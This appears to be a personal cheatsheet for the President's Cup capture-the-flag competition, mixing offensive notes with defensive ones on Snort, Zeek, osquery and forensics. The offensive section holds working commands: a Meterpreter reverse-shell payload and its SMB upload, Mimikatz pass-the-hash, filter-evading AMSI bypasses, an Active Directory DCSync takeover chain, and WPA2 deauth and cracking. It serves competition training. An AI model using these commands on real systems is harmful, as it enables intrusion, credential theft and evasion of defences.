    =============================================================

    __________                         _________
    \______   \_______   ____   ______ \_   ___ \ __ ________
     |     ___/\_  __ \_/ __ \ /  ___/ /    \  \/|  |  \____ \
     |    |     |  | \/\  ___/ \___ \  \     \___|  |  /  |_> >
     |____|     |__|    \___  >____  >  \______  /____/|   __/
                            \/     \/          \/      |__|

    =============================================================

==============================================
# Cheatsheet for PresCup!
==============================================

# Approaching a challenge
* Notes
    * Read the challenge title and extract clues
    * Read the challenge description and extract clues
    * Read every sentence and extract clues
    * Compile every clue and piece of information you've been given along the way and step back after 1 hour
* Landing on a linux box
    * history
    * find / -mtime -30 2\>/dev/null
    * grep -iR pcup{ .
    * updatedb/locate (special file extensions relevant to challenge, ex. png)
    * cat other users .bash\_history files
    * sudo -l

# OCO

## Web Hacking

* Check the source
* Check for sql injection (every field)
* Check for command injection (every field - ``, $(), ;, || id ||, && etc)
* Use Perl one-liner reverse shells (they use docker images w/perl by default)
    * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl
* Run everything through Burp
* Look at Cookies

## Wireless
* Start monitor mode: airmon-ng start [interface]
* List access points and frequencies: airodump-ng -b abg [interface]mon
* Collect auth handshake: airodump-ng -c [target_channel] -w [filename] [interface]mon
* Deauth client (allows you to collect handshake in above command): aireplay-ng -0 1 -a [access_point_mac] -c [client_mac] [interface]mon
* Bruteforce pre-shared WPA2 key (they use rockyou): aircrack-ng -w [wordlist] [cap_file]
* Decrypt collected traffic: airdecap-ng -e [ssid] -p [passphrase] [cap_file]

## Windows

* Use `more` to open Alternate Data Streams
    * `dir /r` to find files with Alternate Data Streams.
    * Finding all files with ADS's (recursively):
        * `dir /s /r | find ":$DATA"`
        * Powershell equivalent: `gci -recurse | % { gi $_.FullName -stream * } | where {(stream -ne ':$Data') -and (stream -ne 'Zone.Identifier')}`
            * Ignores ADS `Zone.identifier`; this tell MS whether a file was downloaded or locally created
* Base64: `[System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("lkjasflkjasdfklj"))`
* Mimikatz
    * `sekurlsa::pth /user:Administrator /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd`
* Responder syntax
* `msfvenom -p windows/x64/meterpreter_reverse_https -a x64 LHOST=192.168.58.128 LPORT=443 -f exe --platform Windows -o reverse_https.exe`
* Curl to smb upload files: `curl --upload-file /root/reverse_https.exe -u 'windev2101eval\user' smb://192.168.58.153/c$/`
* Meterpreter Post
    * https://www.offensive-security.com/metasploit-unleashed/post-module-reference/
    * use windows/manage/multi_meterpreter_inject
    * getuid
    * sysinfo
    * load kiwi      creds_all
    * run post/windows/gather/credentials/credential_collector
    * run post/windows/gather/smart_hashdump
    * run post/windows/gather/bloodhound
* Privesc
    * use exploit/windows/local/cve_2020_0796_smbghost
        * set SESSION $SESSION$
    * run post/multi/recon/local_exploit_suggester
    * Dumphashes
    * lsa_dump_sam
    * dc_sync
    * steal_token
    * Winpeas
* Powershell
    * ps | ? { $_.path -Match "C:\\" } | select name,Path
* Red Teaming
    * Forest HTB Walkthrough
        * RPCClient
            * Null LDAP queries: rpcclient -U "" -n 10.10.10.161
                * enumdomusers
                * enumdomgroups
        * Dump LDAP users: `impacket-GetADUsers -all -no-pass -dc-ip 10.10.10.161 htb.local/`
        * Find ASREPRoast'able: `impacket-GetNPUsers -usersfile users.txt -request -dc-ip 10.10.10.161 -no-pass htb.local/`
        * Hashcat for ASREP: `hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force`
        * Evil-winrm
            * evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice -s /root/tools/powershell_scripts/
            * menu
            * Bypass-4MSI
            * SharpHound.ps1
            * Invoke-BloodHound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
        * Add a user to privileged group
            * $pass = ConvertTo-SecureString "password" -AsPlainText -Force
            * New-AdUser testt -AccountPassword $pass -Enabled $True
            * Add-ADGroupMember -Identity "Exchange Windows Permissions" -members testt
        * Escalate (without powerview)
            * impacket-ntlmrelayx -t ldap://10.10.10.161 --escalate-user testt    (visit http://127.0.0.1)
        * Escalate (with powerview)
            * Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity testt -Rights DCSync
        * impacket-secretsdump -dc-ip 10.10.10.161 htb.local/testt:password@10.10.10.161
        * impacket-psexec htb.local/administrator@10.10.10.161 'powershell.exe' -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
    * hascat for TGS: `hashcat -m 13100 administrator.kerb /usr/share/wordlists/rockyou.txt --force -potfile-disable`
    * AMSI
        * Disable AMSI (has been patched): [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
        * Same thing as above but evades filters: [Ref].Assembly.GetType("System.Management.Automation.Amsi"+"Utils").GetField("amsiIn"+"itFailed","NonPublic,Static").SetValue($null,$true)
        * May need to run the command again if you get blocked again. Triggering AMSI too many times causes a lockout, then you can't even disable it.
        * Here's a repo with more AMSI stuff: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell (the above commands are the Matt Graebers Reflection method)
    * Get all files from a remote SMB share
        * `smbclient //10.10.10.100/Replication`
        * `RECURSE ON`
        * `PROMPT OFF`
        * `mget *`


## Linux
* Password bruteforce wordlist mangling generation:
    * `rsmangler -p -d -r -t -T -c -u -l -s -e -I --punctuation -a -C --pna --pnb --na -nb --force --space --file words.txt --output wordsmangled.txt`
* Baron Samedit sudo vuln (CVE-2021-3156) - 1.8.2 to 1.8.31p2 and 1.9.0 to 1.9.5p1
    * https://github.com/blasty/CVE-2021-3156/
    * https://github.com/TH3xACE/SUDO_KILLER/tree/master/exploits/CVE-2021-3156 <- different exploits for different versions. See readme, pick one.

# DCO

## Snort
* Basic rule syntax:
    * alert ip 37.46.12.6 !502 -> any any (msg: "Non-Authorized port from PLC"; sid:2233002; rev:1;)

## PCAPS

### Wireshark
* Filter and export selected packets often to speed up analysis
* dns.qry.name contains "ala.net"
* Look for python-requests as user agent <- devs are lazy

### Misc
* Convert pcapng to pcap
    * editcap -F pcap test.pcapng test.pcap
* Merge convert
    * mergecap -F pcap -w outfile.pcap infile_1.pcapng infile_2.pcapng
* Distill to netflow
    * nfpcapd -r infile.pcap -S 1 -l output_directory/
* Distill to bro
    * zeek -r pcap_to_log.pcap local "Log::default_rotation_interval = 1 day"
* Detect beacons/malicious traffic
    * https://github.com/activecm/rita

### SecurityOnion
* Make sure to convert from pcapng to pcap first vv
    * so-import-pcap /mnt/hgfs/VMShare/my_pcap.pcap
* so-reset
* https://user-images.githubusercontent.com/7849311/57718306-029d5180-764b-11e9-86b9-cf0f69c56ac6.jpg
* Zeek file extraction:
    * /nsm/zeek/extracted/complete
* DNS anomaly detection (exfil)
    * https://docs.securityonion.net/en/2.3/dns-anomaly-detection.html
* ICMP anomaly detection (c2)
    * https://docs.securityonion.net/en/2.3/icmp-anomaly-detection.html
* If trying to find a specific attack (and not a vuln scanner) - look at user agents (python-requests)
    * Security Onion - HTTP dashboard, then scroll through user agents

## OSQuery

* Basic osquery info: SELECT * FROM osquery_info;
* Check if Windows has bitlocker enabled: SELECT * FROM bitlocker_info;
* Check if Linux has disk encryption: SELECT name, uuid, encrypted FROM disk_encryption WHERE uuid != "";
* Get Linux users (can be used to find malicious ones): SELECT username, description, directory, uid FROM users;
* Check for directory created by EternalRocks virus: SELECT * FROM file WHERE directory = "C:\\Program Files\\Microsoft Updates"
* Cheat sheet for process interrogation: https://defensivedepth.files.wordpress.com/2018/10/osquery-handout.pdf

## Memory Forensics

### SIFT
* rekal -f image.vmem
    * > pslist
    * > procinfo <pid>
    * > desktop
    * > sessions
    * > threads
    * > connections
    * > devicetree
    * > dt("_EPROCESS")
    * > dlllist <pid>
    * > handles <pid>
    * > filescan output="filescan.txt"
    * > hives
    * > regdump
    * > vmscan
    * > certscan
    * > mimikatz
    * > netscan
    * > netstat
    * > dns_cache
    * > messagehooks
    * > ... more -- see their cheatsheet for dumping, rootkits, etc

* rekal for malicious procs
    * > describe(pstree) - View columns to output
    * > select \_EPROCESS,ppid,cmd,path from pstree()
    * > malfind <pid>
    * > ldrmodules <pid> verbosity=3   (detect unlinked dlls)

* vol.py command –f /path/to/windows_xp_memory.img --profile=WinXPSP3x86
    * > imageinfo (help identify profile) <- run this immediately - it will take time
    * > pslist
    * > connscan
    * > files
    * > imagecopy
    * > procdump
    * > sockscan
    * > ... more -- see cheatsheet for everything else...

## HDD Forensics
* Assume all users are using the same box as your analysis box. If you want some info - replace your entire Program Files\whatever_program directory with theirs
* log2timeline –r –p –z <system-timezone> –f <type-input> /mnt/windows_mount –w timeline.csv
* autopsy <- run this immediately (will take a while)

## Misc Windows Forensics/Defense
* Check c:\Windows\prefetch
    * `powershell /c "dir C:\Windows\Prefetch\ | Sort -Descending -Property LastWriteTime | select -First 50"`
* Powershell
    * If you need to compare boxes (processes, firewalls, scheduled tasks, wmi subsribers, etc)
        * `psexec \\server01,server02 -s powershell Enable-PSRemoting -Force`
        * `$s1, $s2 = New-PSSession -ComputerName Server01,Server02`
        * Processes
            * `$p1 = Invoke-Command -Session $s1 -ScriptBlock {Get-Process}`
            * `$p2 = Invoke-Command -Session $s2 -ScriptBlock {Get-Process}`
            * `Compare-Object $p1 $p2 -Property name`
        * WMI Subscribers
            * `$p1 = Invoke-Command -Session $s1 -ScriptBlock {Get-WmiObject -Namespace root\Subscription -Class __EventFilter}`
            * `$p2 = Invoke-Command -Session $s2 -ScriptBlock {Get-WmiObject -Namespace root\Subscription -Class __EventFilter}`
            * `Compare-Object $p1 $p2 -Property query`
        * Firewall
            * `$p1 = Invoke-Command -Session $s1 -ScriptBlock {Get-NetFirewallRule -All}`
            * `$p2 = Invoke-Command -Session $s2 -ScriptBlock {Get-NetFirewallRule -All}`
            * `Compare-Object $p1 $p2 -Property name`
        * Schedule Tasks
            * `$p1 = Invoke-Command -Session $s1 -ScriptBlock {Get-ScheduledTask}`
            * `$p2 = Invoke-Command -Session $s2 -ScriptBlock {Get-ScheduledTask}`
            * `Compare-Object $p1 $p2 -Property TaskName`
* List most recently modified firewall rules
```
$Events = Get-WinEvent -ErrorAction SilentlyContinue -FilterHashtable @{logname="Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"; id=2004}
ForEach ($Event in $Events) {
    $eventXML = [xml]$Event.ToXml()
    For ($i=0; $i -lt $eventXML.Event.EventData.Data.Count; $i++) {
        Add-Member -InputObject $Event -MemberType NoteProperty -Force `
            -Name  $eventXML.Event.EventData.Data[$i].name `
            -Value $eventXML.Event.EventData.Data[$i].'#text'
    }
}
$Events | Format-Table -Property TimeCreated,RuleName -AutoSize
```
* If you need to find reg keys - use regedit to export them and look at last modified timestamp
* Procmon:
    * Filter - Process Name is blah.exe then Include
    * Filter - Use Path contains c:\Users\student\desktop\Challenge\ then include
* Always check for Shadow Volumes with Shadow Explorer
* Break veracrypt partitions: truecrack -t scada101.mp4 -c abcdefghijklmnopqrstuvwxyz -s 4 -m 4 -v -h
* Extracting files to show metadata
    * mmls analysis.dd (shows partitions)
    * mmcat analysis.dd 2 > /home/examiner/Desktop/cases/ntfs.dd
    * Show MFT entries: fls -f ntfs -r ntfs.dd
    * Extract the mft: icat -f ntfs ntfs.dd 0 > mft.dd
* Extracting data from slack space
    * mmls analysis.dd
    * fsstat -o 63 analysis.dd   (where 63 is the start of a block)
    * mount -o ro.noatime,loop,offset=$((63\*512)) analysis.dd /mnt/windows_mount
    * /opt/lsoft/DiskEditor/DiskEditor.sh   <- good tool
* Look at shadow volumes
* Look at firefox/IE/Chrome cache
* Hashes, domain admin creds, domain creds (dcsync)
* Cached registry creds (IMAP Outlook)
    * $data = Get-ItemProperty "Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Charles jackson\987124987102847\0000000009"
    * $pdata = $data[1..$data.Length]
    * [System.Text.Encoding]::Unicode.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($pdata, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))

## Zeek Scripting
    Run script: bro -i [interface] [script_file]
    Count unique originating IPs from logfile: cat [log_file] | bro-cut id.orig_h | uniq -c
    ** Print out new connections: **
    @load base/protocols/conn
    event new_connection (c: connection)
    {
        print c;
    }
    ** Print out new connections, formatted: **
    @load base/protocols/conn
    event new_connection(c: connection)
    {
        print fmt("Src IP/Port: (%s, %s) Dst IP/Port: (%s,%s)", c$id$orig_h, c$id$orig_p, c$id$resp_h, c$id$resp_p);
    }
    ** Log HTTP and SSH: **
    module PortTest;
    export{
    #create global variable of ports to reference
        global ports = {
            80/tcp,
            443/tcp,
            22/tcp
        };
        redef enum Log::ID += { LOG };
    #create a new connection_info record
        type Connection_Info: record {
            sip: addr    &log;
            dip: addr    &log;
            sport: port  &log;
            dport: port  &log;
        };
    }
    event new_connection(c: connection){
    #stores the source/dest ips and ports
        local temp_conn: PortTest::Connection_Info = [$sip=c$id$orig_h, $dip=c$id$resp_h, $sport=c$id$orig_p, $dport=c$id$resp_p];
        if (c$id$resp_p in ports || c$id$orig_p in ports){
            Log::write(PortTest::LOG, temp_conn);
        }
    }
    #create a stream to our new log
    event bro_init(){
        Log::create_stream(PortTest::LOG, [$columns=Connection_Info, $path="port_test"]);
    }

# Reversing
* Possibly useful (yara rule generation, etc): https://github.com/cmu-sei/pharos
* For all windows - use FLOSS (strings - and read all of them)


# Escape Room Thoughts
* Closely record all hints
    * What items do you have? Where did you get them?
    * Which hints came from where?
    * What is the mentality of the individual in the environment?
* What happens when boxes come online?
    * DHCP leases are requested, in order of which devices boot first.
* Expect there to be Red Teaming
    * Be able to do a dump hashes, impersonate token, lateral move to DC, dump hashes, repeat

